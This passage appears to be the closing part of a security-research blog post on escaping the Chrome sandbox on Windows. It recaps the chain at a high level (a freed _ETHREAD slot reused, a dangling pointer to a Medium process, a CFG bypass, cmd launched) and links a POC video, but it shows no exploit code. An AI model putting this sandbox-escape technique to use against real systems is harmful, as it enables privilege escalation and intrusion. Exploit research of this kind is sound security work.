+<p>This bypasses CFG pretty simply too, right? hehe By borrowing a single unguarded call, we made every point CFG checks see nothing but legitimate targets. And finally, with one button click, cmd comes up just like this!!!! &#x1F389;</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.youtube.com/watch?v=2AMNjFq7V-A&amp;feature=youtu.be">POC Video</a></p>
+<h1 id="5-Outro"><a href="#5-Outro" class="headerlink" title="5. Outro"></a>5. Outro</h1><p>Thank you for making it all the way to Step 6! We started from a single BSOD, made the file picker fill in the freed <code>_ETHREAD</code> slot, used that dangling pointer to read and write a Medium process, and in the end popped cmd at Medium IL. </p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image16.png" srcset="/img/loading.gif" alt="image"></p>
+<p>Tai Lung has finally broken out of prison and traveled a long road to stand before Master Shifu. Having come all the way from the Untrusted level to the Medium level, just one final gate remains.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image17.png" srcset="/img/loading.gif" alt="image"></p>
+<p>Yes &#x2014; the one that lets us become the Dragon Warrior! The Windows LPE that takes us all the way to SYSTEM! Wipeload Step 7 will come to you as banda&#x2019;s Windows LPE article!</p>
+<p>Thank you for reading all the way through!! &#x1F64C;</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://learn.microsoft.com/en-us/windows/win32/sync/interlocked-singly-linked-lists">https://learn.microsoft.com/en-us/windows/win32/sync/interlocked-singly-linked-lists</a></p>
+<p><a href="https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/">https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://r0keb.github.io/posts/Windows-Kernel-Pool-Internals/">https://r0keb.github.io/posts/Windows-Kernel-Pool-Internals/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/Windows-Kernel/">Windows Kernel</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Chromium/">Chromium</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Sandbox-Escape/">Sandbox Escape</a>
+                  
+                  <a class="hover-with-bg" href="/tags/gongjae/">gongjae</a>
+                  
+                  <a class="hover-with-bg" href="/tags/IPC/">IPC</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Wipeload/">Wipeload</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Chrome-Sandbox/">Chrome Sandbox</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Mojo/">Mojo</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_gongjae.jpg" srcset="/img/loading.gif" alt="gongjae">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">gongjae</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/gongjae">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2026/08/08/banda/Wipeload_step7/KR/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[도닦기] 7단계: Lock the Pages, Break the Kernel (KR)</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2026/08/01/gongjae/Wipeload_step6/KR/">
+                    <span class="hidden-mobile">[도닦기] 6단계: 안 아프게 SandBox 탈출하는 법 (KR)</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Wipeload Step 6.] How to Escape the SandBox Painlessly (EN)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
